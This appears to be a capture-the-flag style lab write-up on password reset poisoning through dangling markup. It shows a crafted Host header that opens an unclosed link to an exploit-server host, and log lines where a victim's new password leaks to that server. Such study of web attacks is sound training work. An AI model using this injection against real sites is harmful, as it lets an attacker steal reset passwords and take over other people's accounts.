# **Password reset poisoning via dangling markup**

Task: This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.

Toolkit: Buprsuite, Browser

1. We know that the URL in the email is derived from the Host header. So we try injecting some characters and explore that the port is reflected in the email:

\<p\>Hello\!\</p\>\<p\>Please \<a href='https\://0aeb00150427a05c80185d3d00210050.web-security-academy.net:8443/login'\>\<'/login'\>click here\</a\> to login with your new password: 7NlF1c7PIm\</p\>\<p\>Thanks,\<br/\>Support team\</p\>\<i\>This email has been scanned by the MacCarthy Email Security service\</i\>

2. We then send a POST req to /forgot-password with the following Host header:

Host: 0aeb00150427a05c80185d3d00210050.web-security-academy.net:'\<a href="//exploit-0a3d008404f3a01c80d95cf801a300e8.exploit-server.net/?

3. As we can see, the **double quote** is never used. As a result, the entire remaining part of the email is delivered to our server as an access log:     

GET /?/login'\>click+here\</a\>+to+login+with+your\+new+password:+lTN0GT8kgN\</p\>\<p\>Thanks,\<br/\>Support+team\</p\>\<i\>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service\</i\> HTTP/1.1" 200

4. Send the same request with username=carlos:

/?/login'\>click+here\</a\>+to+login+with+your+new+password:+tsZVd5a0h2\</p\>\<p\>Thanks,\<br/\>Support+team\</p\>\<i\>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service\</i\> HTTP/1.1" 200
